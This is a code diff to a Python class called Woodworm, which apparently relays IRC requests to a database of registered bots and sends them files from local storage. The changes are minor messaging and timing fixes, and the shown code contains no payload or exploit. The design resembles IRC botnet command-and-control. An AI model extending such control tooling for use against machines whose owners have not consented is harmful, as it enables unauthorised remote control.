@@ -82,6 +82,7 @@ class Woodworm:
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
             self.syslog.log(f"Number of bots: {len(self.botnetDB.get_bots())}", level=logger.LogLevel.INFO)
 
+            await asyncio.sleep(0.5)
             bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
 
 
@@ -121,10 +122,11 @@ class Woodworm:
         irc_connection = args[0]
         filename = kwargs.get('filename')
         receiver = kwargs.get('receiver')
+        nickname = kwargs.get('nickname')
         file_path = os.path.join(self.storageDirectory, filename)
 
         if not os.path.exists(file_path):
-            await irc_connection.send_query(self.ircNick, f"No such file: {filename}")
+            await irc_connection.send_query(nickname, f"No such file: {filename}")
             return
 
         bot = self.botnetDB.get_bot(receiver)
@@ -133,6 +135,7 @@ class Woodworm:
             return
 
         bot.get_tcp_connection().send_file(file_path)
+        await irc_connection.send_query(nickname, f"File {filename} sent to {receiver}")
 
 
     async def list_files(self):
